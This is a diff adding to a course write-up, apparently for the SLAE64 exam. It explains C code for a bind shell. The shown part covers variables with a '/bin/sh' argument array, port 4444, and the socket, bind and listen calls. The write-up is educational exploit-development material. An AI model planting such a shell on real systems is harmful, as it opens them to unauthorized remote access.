@@ -10,7 +10,69 @@ Of course, this 'security' is limited and anyone eavesdropping on the connection
 
 ### High Level Proof of Concept
 
-Vivek provided a rough outline of some C code during the course and this was taken as a base for the project.
+Vivek provided a rough outline of the code in C during the course and this was taken as a base for this assignment.
+
+The full listing of my version of the code is hosted on GitHub: [Bind_Shell.c](https://github.com/CodeheadUK/SLAE64/blob/master/src/bind_shell.c).
+
+The basic sections of code are:
+
+# Variable Definitions and Initalisation
+
+{{< highlight c >}}
+	// Socket descriptors
+	int svr_sock;
+	int client_sock;
+
+	// Socket definitions
+	struct sockaddr_in server;
+	struct sockaddr_in client;
+	int sockaddr_len = sizeof(struct sockaddr_in);
+
+	// Some strings
+	char *arguments[] = { "/bin/sh", 0 };
+	char *in[] = { "xxxxxxxxxx", 0 };
+	bzero(&in, 10);
+
+	// Loop flag
+	int connected = 0;
+	
+	// Populate the server port information
+	server.sin_family = AF_INET;  // 2
+	server.sin_port = htons(4444);
+	server.sin_addr.s_addr = INADDR_ANY; // 0
+	bzero(&server.sin_zero, 8);
+{{</ highlight >}}
+
+The first two variables are descriptors which will hold the identifiers for the sockets we'll create later.
+
+The <tt>sockaddr_in</tt> structures are used to hold the configuration of the sockets. We populate the <tt>server</tt> configuration manually, but the <tt>client</tt> structure will be populated for us when we accept an incoming connection.
+
+Lastly, we define a couple of string buffers that we'll need later and a flag to control teh authentication loop. The buffer definitions are a bit odd, but we don't want to worry about memory allocation here and will handle these strings differently in the assembly language anyway.
+
+The next chunk of code sets up our server socket, binds it to a port using the <tt>sockaddr_in</tt> configuration and finally starts listening on the port.
+
+{{< highlight c >}}
+// Create the server socket
+if((svr_sock = socket(AF_INET, SOCK_STREAM,  0 )) == -1) // SOCK_STREAM = 1
+{
+	perror("Server socket: ");
+	exit(-1);
+}
+
+// Bind the port
+if((bind(svr_sock, (struct sockaddr *)&server, sockaddr_len)) == -1)
+{
+	perror("Bind: ");
+	exit(-1);
+}
+
+// Start listening for incoming connections
+if((listen(svr_sock, 2)) == -1)
+{
+	perror("Listen: ");
+	exit(-1);
+}
+{{</ highlight >}}
 
 
 
